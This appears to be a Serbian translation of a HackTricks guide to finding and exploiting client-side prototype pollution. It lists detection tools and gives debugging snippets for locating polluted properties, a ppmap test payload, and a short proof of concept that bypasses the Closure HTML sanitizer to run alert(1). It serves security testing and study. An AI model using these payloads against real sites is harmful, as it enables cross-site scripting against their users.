# Klijentska strana Prototip Pollution

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Otkrivanje korišćenjem automatskih alata

Alati [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **i** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) mogu se koristiti za **pronalaženje ranjivosti prototip pollution-a**.

Pored toga, možete koristiti i **browser ekstenziju** [**PPScan**](https://github.com/msrkp/PPScan) da **automatski skenirate** **stranice** koje **pristupate** u potrazi za ranjivostima prototip pollution-a.

### Debugovanje gde se svojstvo koristi <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
### Pronalaženje osnovnog uzroka Problema sa Prototipom <a href="#id-5530" id="id-5530"></a>

Kada je ranjivost prototipnog zagađenja identifikovana od strane bilo kog alata, i ako kod nije previše složen, možete pronaći ranjivost pretraživanjem ključnih reči poput `location.hash`, `decodeURIComponent`, ili `location.search` u Chrome Developer alatima. Ovaj pristup vam omogućava da precizno odredite ranjivi deo JavaScript koda.

Za veće i složenije kodne baze, jednostavan metod otkrivanja ranjivog koda uključuje sledeće korake:

1. Koristite alat za identifikaciju ranjivosti i dobijte payload dizajniran da postavi svojstvo u konstruktoru. Primer koji pruža ppmap može izgledati ovako: `constructor[prototype][ppmap]=reserved`.
2. Postavite prekidnu tačku na prvu liniju JavaScript koda koja će se izvršiti na stranici. Osvežite stranicu sa payload-om, zaustavljajući izvršavanje na ovoj prekidnoj tački.
3. Dok je izvršavanje JavaScript-a pauzirano, izvršite sledeći skript u JS konzoli. Ova skripta će signalizirati kada je svojstvo 'ppmap' kreirano, pomažući u lociranju njegovog porekla:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. Vratite se na karticu **Izvori** i izaberite "Nastavi izvršavanje skripte". JavaScript će nastaviti izvršavanje, a svojstvo 'ppmap' će biti zagađeno kao što se očekivalo. Korišćenje priloženog isečka olakšava identifikaciju tačne lokacije gde je svojstvo 'ppmap' zagađeno. Proučavanjem **Steka poziva**, mogu se primetiti različiti stekovi gde se zagađenje dogodilo.

Prilikom odlučivanja koji stek istražiti, često je korisno ciljati stekove povezane sa JavaScript bibliotekama, jer se zagađenje prototipa često dešava unutar ovih biblioteka. Identifikujte relevantan stek proučavanjem njegovog povezivanja sa bibliotečkim datotekama (vidljivo sa desne strane, slično kao na slici data za vođenje). U scenarijima sa više stekova, poput onih na linijama 4 i 6, logičan izbor je stek na liniji 4, jer predstavlja početno pojavljivanje zagađenja i time koreni uzrok ranjivosti. Klikom na stek bićete usmereni ka ranjivom kodu.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Pronalaženje skriptnih gedžeta

Gedžet je **kod koji će biti zloupotrebljen kada se otkrije ranjivost PP**.

Ako je aplikacija jednostavna, možemo **tražiti** **ključne reči** poput **`srcdoc/innerHTML/iframe/createElement`** i pregledati izvorni kod da bismo proverili da li to **vodi do izvršavanja JavaScript-a**. Ponekad, pomenute tehnike možda neće pronaći gedžete uopšte. U tom slučaju, čisto pregledanje izvornog koda otkriva neke lepe gedžete poput primera ispod.

### Primer pronalaženja PP gedžeta u kodu biblioteke Mithil

Proverite ovaj tekst: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Rekompilacija payload-a za ranjive biblioteke

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Bajpasovanje HTML sanitizera putem PP

[**Ovo istraživanje**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) pokazuje PP gedžete koje treba koristiti za **bajpasovanje sanitizacije** koju pružaju neke biblioteke HTML sanitizera:

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1137).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1138).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Reference

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
